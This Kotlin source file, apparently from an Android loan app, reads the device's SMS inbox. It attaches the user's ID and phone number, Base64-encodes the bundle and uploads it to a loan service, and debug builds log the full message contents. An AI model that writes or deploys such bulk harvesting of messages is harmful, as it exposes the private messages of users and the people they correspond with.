package com.hc.load.collect.sms

import android.text.format.DateUtils
import com.hc.data.common.CommonDataModel
import com.hc.data.sms.SmsInfo
import com.hc.data.user.UserInfo
import com.hc.load.BuildConfig
import com.hc.load.net.LoanInfoService
import com.hc.uicomponent.call.reqApi


import com.hc.uicomponent.provider.ContextProvider
import com.hc.uicomponent.utils.GsonUtils
import com.hc.uicomponent.utils.PhoneUtil
import frame.utils.Base64
import kotlin.concurrent.thread

object CollectSmsInfo {

    /**
     * 获取短信并上传
     */
    fun collectSmsInfo() {
        thread (true) {
            val applicationContext = ContextProvider.app
            val getSmsStartTime = System.currentTimeMillis()
            println("---------->>>开始获取短信信息 $getSmsStartTime")
            val smsInfoBean: List<SmsInfo.SmsInfoBean> = PhoneUtil.getSmsInfos2(applicationContext)
            if (BuildConfig.DEBUG) {
                val json = GsonUtils.toJsonString(smsInfoBean)
                val getSmsEndTime = System.currentTimeMillis()
                 println("---------->>>完成获取短信信息 $getSmsEndTime")
                 println("---------->>>短信数量 ${smsInfoBean.size}")
                 println("---------->>>短信获取时间 ${DateUtils.getRelativeTimeSpanString(getSmsStartTime, getSmsEndTime, 0)}")
                 println("---------->>>短信获取时间 ${getSmsEndTime - getSmsStartTime}")
                 println("---------->>>完成获取短信信息 $json")
            }

            val appName: String = applicationContext.packageManager.getApplicationLabel(applicationContext.applicationInfo).toString()
            val appId: String = applicationContext.packageName
            val userId: String = CommonDataModel.mTokenData?.userId?:""
            val timeStamp: Long = System.currentTimeMillis()
            val smsInfo = SmsInfo()
            smsInfo.appId = appId
            smsInfo.appName = appName
            smsInfo.phoneNo =CommonDataModel.mTokenData?.mobile?:""
            smsInfo.userId = userId
            smsInfo.timeStamp = timeStamp
            smsInfo.smsInfo = smsInfoBean

            val smsJson = Base64.encode(GsonUtils.toJsonString(smsInfo).toByteArray(Charsets.UTF_8))
            //upload sms
            reqApi(LoanInfoService::class.java, { saveSmsList(smsJson) })
        }
    }


}